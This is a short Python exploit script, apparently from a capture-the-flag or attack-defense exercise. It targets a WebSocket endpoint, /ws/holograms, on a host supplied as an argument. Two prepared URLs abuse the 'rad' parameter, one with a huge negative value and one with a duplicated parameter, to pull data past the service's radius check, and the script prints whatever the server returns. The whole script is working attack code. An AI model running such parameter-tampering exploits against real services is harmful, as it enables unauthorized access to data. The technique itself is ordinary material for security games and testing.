from ws4py.client import WebSocketBaseClient
from ws4py.manager import WebSocketManager
import time
import sys

m = WebSocketManager()
vuln1 = 'ws://{}/ws/holograms?x=0&y=0&z=0&rad=-100000000'
vuln2 = 'ws://{}/ws/holograms?x=0&y=0&z=0&rad=1&rad=100000000'


class EchoClient(WebSocketBaseClient):
    def handshake_ok(self):
        m.add(self)

    def add_writer(self, link):
        self.writer = link

    def received_message(self, msg):
        self.writer.append(str(msg))


def run_ws(ws_addr):
    messages = []
    m.start()
    client = EchoClient(ws_addr)
    client.add_writer(messages)
    client.connect()
    time.sleep(1)
    m.close_all()
    m.stop()
    m.join()
    return messages


if len(sys.argv) == 3:
    if sys.argv[1] == "1":
        print(run_ws(vuln1.format(sys.argv[2])))
    elif sys.argv[1] == "2":
        print(run_ws(vuln2.format(sys.argv[2])))
    else:
        print("No such vuln")

